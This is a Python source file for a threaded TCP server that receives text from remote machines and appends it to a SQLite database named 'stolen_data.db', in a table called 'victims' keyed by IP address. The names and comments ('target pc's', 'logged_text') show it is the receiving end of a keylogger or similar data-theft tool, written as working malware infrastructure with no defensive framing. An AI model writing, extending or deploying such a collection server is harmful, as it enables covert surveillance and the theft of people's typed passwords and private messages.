#author: lars 
import socket
from threading import Thread
import sqlite3
import errno
def main():
     
    class Database:
        def connect_db(self,name):#stolen_data.db or sth like this
            self.conn=sqlite3.connect(name,check_same_thread=False)
            self.c=self.conn.cursor()

            self.create_table()

        def create_table(self):
            self.c.execute("CREATE TABLE IF NOT EXISTS victims (id INTEGER PRIMARY KEY, ip_address TEXT, logged_text TEXT)")
            self.conn.commit()

        def add_data(self,addr,data):
            print("addr:",addr)
            self.c.execute("SELECT * FROM victims WHERE ip_address=?",(addr[0],))
            results=self.c.fetchall()
            #ip already registered !! will change because target pc's won't have dynamic dns
            print("len of results of ip in db:",len(results))
            if len(results)>=1:
                print("known ip, updating text on ip")
                self.c.execute("SELECT logged_text FROM victims WHERE ip_address=?",(addr[0],))
                current_logged_data=self.c.fetchall()
                print("Data:",data)
                
                updated_data=current_logged_data[0][0] +data
                self.c.execute("UPDATE victims SET logged_text=? WHERE ip_address=?",(updated_data,addr[0]))
                self.conn.commit()
            else:#create new record
                print("New ip, creating new record in database")
                self.c.execute("INSERT INTO victims (ip_address,logged_text) VALUES (?,?)",(addr[0],data))
                #self.c.execute("INSERT INTO victims (ip_address,logged_text) VALUES (?,?)",(addr,))



    PORT = 9234        

    database=Database()
    database.connect_db("stolen_data.db")
    database.create_table()

    def on_new_client(conn,addr):
        print("Added new client: {0}".format(addr))
        while True:
            #do some checks and if msg == someWeirdSignal: break:
            try:
                msg=conn.recv(1024)#make it be more flexibel later
                
                print(msg.decode("utf-8"))
                database.add_data(addr,msg.decode("utf-8"))
                conn.send(b"!!")#this should be b"!!"

            except socket.error as error:
                if error.errno==errno.ECONNRESET:#dont know why, but maybe make it loop here,not stop
                    print("Client {0} closed the connection".format(addr))
                    break
                elif error.errno==errno.EPIPE:
                    print("Broken Pipe. Client {0} probably closed the connection.".format(addr))
                    break
                else:
                    raise
        conn.close()

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("", PORT))#maybe bind to own public ip-address
        s.listen(5)
        print("Program started")

        while True:
            c, addr = s.accept()   # Establish connection with client.
            #doing stuff withincoming connections here
            print("Connected to {0}".format(addr))

            t=Thread(target=on_new_client, args=(c,addr))
            t.start()
        


if __name__=="__main__":
    main()
